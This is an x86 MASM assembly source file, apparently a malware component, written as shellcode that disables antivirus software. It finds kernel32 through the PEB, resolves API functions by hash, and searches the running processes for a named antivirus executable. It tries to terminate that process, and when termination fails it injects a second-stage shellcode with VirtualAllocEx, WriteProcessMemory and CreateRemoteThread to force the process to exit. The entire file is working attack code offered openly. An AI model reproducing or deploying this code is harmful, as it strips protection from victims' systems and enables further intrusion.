;That shellcode will be inject to the AV process
.386
.model flat, stdcall
 option casemap :none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc

includelib \masm32\lib\kernel32.lib


PROCESSENTRY32W	STRUCT
	dwSize DWORD ?
	cntUsage DWORD ?
	th32ProcessID DWORD ? ; this process
	th32DefaultHeapID DWORD ?
	th32ModuleID DWORD ? ; associated exe
	cntThreads DWORD ?
	th32ParentProcessID DWORD ? ; this process's parent process
	pcPriClassBase DWORD ? ; Base priority of process's threads
	dwFlags DWORD ?
	szExeFile dw MAX_PATH dup (?) 
PROCESSENTRY32W		ENDS

du	macro string
local bslash
bslash = 0
	irpc c,<string>
	if bslash eq 0
		if '&c' eq "/"
	        bslash = 1
		elseif '&c'gt 127
		db ('&c'- 0B0h),4
		else
		dw '&c'
		endif
	else
           bslash = 0
           if '&c' eq "n"
           DW 0Dh,0Ah
           elseif '&c' eq "/"
           dw '/'
           elseif '&c' eq "r"
           dw 0Dh
           elseif '&c' eq "l"
           dw 0Ah
           elseif '&c' eq "s"
           dw 20h
           elseif '&c' eq "c"
           dw 3Bh
           elseif '&c' eq "t"
           dw 9
	   endif
	endif
	endm
	dw 0
endm

.code

start:

jmp over_data
;Test-test
;Search_Name: du <calc.exe>	
curr_PID	dd  0
Search_Name db   100 dup (0)
over_data:
call delta_
delta_:
pop ebp
sub ebp,delta_

call GetKernBase

push ebx           ; store in stack kernel_base

mov ecx,100	   	   ; x1000 mod-Kill :D
push ecx
;cycle of searching Process
next_search:
mov ebx,[esp+4]
lea esi,[ebp+Search_Name]
lea edi,[ebp+second_stage]
mov ecx,[ebp+curr_PID]
push ecx
push edi
push esi
push ebx
call SearchAndDestroyAV
;;Delay time
mov ebx,[esp+4]
push 3d9972f5h
push ebx
call GetApiProc
or eax,eax
jz error_exit
push 1000
call eax
;;
pop ecx
dec ecx
jecxz done_
push ecx
jmp next_search
done_:
;TerminateProcess/suspend or other shit,here
mov ebx,[esp]
;push 95902b19h  ;ExitProcess
push 0eeba5ebah  ;SuspendThread
push ebx
call GetApiProc

add esp,4
or eax,eax
je error_exit
;push 0
push -2
call eax     ;SuspendThread/ExitProcess
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
error_exit:
ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
SearchAndDestroyAV proc kernel_base:DWORD,av_name:DWORD,shell2_addr:DWORD,except_PID:DWORD
LOCAL StartupInfo:STARTUPINFO
LOCAL ProcessInfo:PROCESS_INFORMATION
LOCAL 	hSnapshot:HANDLE
LOCAL 	  ProcEnt:PROCESSENTRY32W
LOCAL     procHan:HANDLE
LOCAL     procHan2:HANDLE
LOCAL     OpenProcess_:DWORD
LOCAL     CloseHandle_:DWORD
LOCAL 	  memptr:DWORD
LOCAL     dwWritten:DWORD
LOCAL     dwThreadID:DWORD
push 723eb0d5h			;CloseHandle
push kernel_base
call GetApiProc
or 	 eax,eax
jz exit_1
mov CloseHandle_,eax

push 5bc1d14fh
push kernel_base
call GetApiProc	 		;CreateToolhelp32Snapshot
or eax,eax
jz exit_1
push 0
push TH32CS_SNAPPROCESS
call eax				;invoke CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS,0
cmp eax ,INVALID_HANDLE_VALUE
jz exit_1
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
mov hSnapshot,eax
push 0fbc6485bh			;Process32FirstW
push kernel_base
call GetApiProc
or eax,eax
jz exit_2
mov [ProcEnt.dwSize],SIZEOF PROCESSENTRY32W
lea esi,ProcEnt
push esi
push hSnapshot
call eax				;invoke Process32FirstW, hSnapshot,ADDR ProcEnt
or eax,eax
jz exit_2
check_name:
;Except current process ;)
mov eax,except_PID
cmp eax, ProcEnt.th32ProcessID
jz cycle_

cld
xor     eax, eax
mov     edx, eax
mov     edi, av_name
mov     esi, edi
mov     ecx, -1
repne   scasw
not     ecx
mov     edi, esi
lea esi,ProcEnt.szExeFile
repe    cmpsw
mov     ax, WORD PTR[esi-2]
mov     dx, WORD PTR[edi-2]
sub     eax, edx
or      eax,eax
je      found_it
cycle_:
push 98750f33h		;Process32NextW
push kernel_base
call GetApiProc
or   eax,eax
jz 	 exit_2
lea esi,ProcEnt
push esi
push hSnapshot
call eax				;invoke Process32NextW, hSnapshot,ADDR ProcEnt

test eax,eax
jz exit_2
jmp check_name
found_it:
push 99a4299dh
push kernel_base
call GetApiProc
or eax,eax
jz exit_2
mov  OpenProcess_,eax
push ProcEnt.th32ProcessID
push FALSE
push PROCESS_TERMINATE
call eax				;;invoke OpenProcess, PROCESS_TERMINATE,FALSE,[ProcEnt.th32ProcessID]
or eax,eax
jz exit_2
mov procHan,eax

push 9e6fa842h			;TerminateProcess
push kernel_base
call GetApiProc
or eax,eax
jz exit_3
push 29ah
push procHan
call eax				;TerminateProcess
or eax,eax
jnz exit_3             ; 

;;Here another method to terminate av shit
mov eax,OpenProcess_
push ProcEnt.th32ProcessID
push FALSE
push PROCESS_ALL_ACCESS  ; Haha change it <<
call eax
or eax,eax
jz exit_3
;Opened?hah lol,ok now we inject 2nd shellcode to AV process exactly
mov procHan2,eax

push 9abfb8a6h			;VirtualAllocEx
push kernel_base
call GetApiProc
or eax,eax
jz exit_2_1
push PAGE_EXECUTE_READWRITE
push MEM_COMMIT
push (size_1-second_stage)
push NULL
push procHan2
call eax			;;invoke VirtualAllocEx, hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE
or eax,eax
jz exit_2_1
MOV memptr,eax
push 0bea0bf35h
push kernel_base
call GetApiProc
or eax,eax
jz exit_2_1

lea esi,dwWritten
push esi
push (size_1-second_stage)
mov esi,shell2_addr
push esi
push memptr
push procHan2
call eax			;invoke WriteProcessMemory, hProcess, memptr, shell_addr, size, ADDR dwWritten
or eax,eax
jz exit_2_1
;;Shellcode injected,now launch remote thread hehe
push 0e61874b3h
push kernel_base
call GetApiProc
or eax,eax
jz exit_2_1
lea esi,dwThreadID
push esi
push NULL
push NULL
push memptr
push NULL
push NULL
push procHan2
call eax
or eax,eax
jz failed_inject
push eax
mov eax,CloseHandle_
call eax
failed_inject:
 
;invoke CreateRemoteThread, hProcess, NULL, 0, EBX, memptr, 0, ADDR dwThreadID
exit_2_1:
mov eax,CloseHandle_
push procHan2
call eax
exit_3:				
mov eax,CloseHandle_
push procHan
call eax				;invoke CloseHandle, hSnapshot
jmp cycle_
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
exit_2:
mov eax,CloseHandle_
push hSnapshot
call eax				;invoke CloseHandle, hSnapshot
exit_1:
ret

SearchAndDestroyAV endp

;;Second Stage Shellcode
second_stage:
call GetKernBase
push 95902b19h
push ebx
call GetApiProc
or eax,eax
je error_shell2
push 29ah
call eax     ;ExitProcess
error_shell2:
ret
GetKernBase:
;Get kernel base
;hash kernel32 [0x46DA55CA]
cld
xor edx,edx
push 40h
sub dword ptr [esp],10h
pop edx
assume fs:nothing
mov edx,fs:[edx]
mov edx, [edx+0Ch]
mov edx, [edx+14h]

next_:
push 46DA55CAh;
push 24;
mov esi, [edx+28h]
xor edi,edi
pop ecx
loop_mod1:
xor eax,eax
lodsb
cmp al,'a'
jl not_lowercase
sub al,20h
not_lowercase:
rol edi,15
push edi
ror edi,3
add dword ptr [esp],edi
pop edi

xor edi,eax

loop loop_mod1
pop eax
cmp edi,eax
mov ebx,[edx+10h]
mov edx,[edx]
jne next_
ret

;;;;;;;;;;;;;;;;ApiFunc
;;arg1 == kernbase
;;arg2 == search hash
GetApiProc:
mov eax,[esp+4]  ;kern_base
mov ecx,[esp+8]  ;get hash
push ebp         ;save delta
mov ebp,ecx		 ;ebp == hash

mov ebx,[eax+3ch]
add ebx,eax
mov edx,[ebx+078h]
add edx,eax
mov ecx,[edx+020h]           
add ecx,eax                  	
mov edi,[edx+024h]            	
add edi,eax
mov edx,[edx+1ch]
add edx,eax
main_cycle:
mov esi,[ecx]
add esi,eax ;; edi=pointer to name
push eax

push edi
xor edi,edi
xor eax,eax
hash_cycle_api:
lodsb
or al,al
je ok_end_cycle
push edi
shl edi,7
shr dword ptr[esp],19h
or edi,[esp]
add esp,4
xor edi,eax
jmp hash_cycle_api
ok_end_cycle:
mov eax,edi  ;; eax==hash
pop edi
cmp eax,ebp
je hash_founded
pop eax
add ecx,4              
add edi,2                     
jmp main_cycle
hash_founded:
xor eax,eax
push word ptr [edi]
pop ax
mov edi,eax
pop eax
mov edx,[edx+edi*4]                ; get the address
add edx,eax
xchg eax,edx
pop ebp  ;restore delta to ebp
retn 8
size_1:
end start
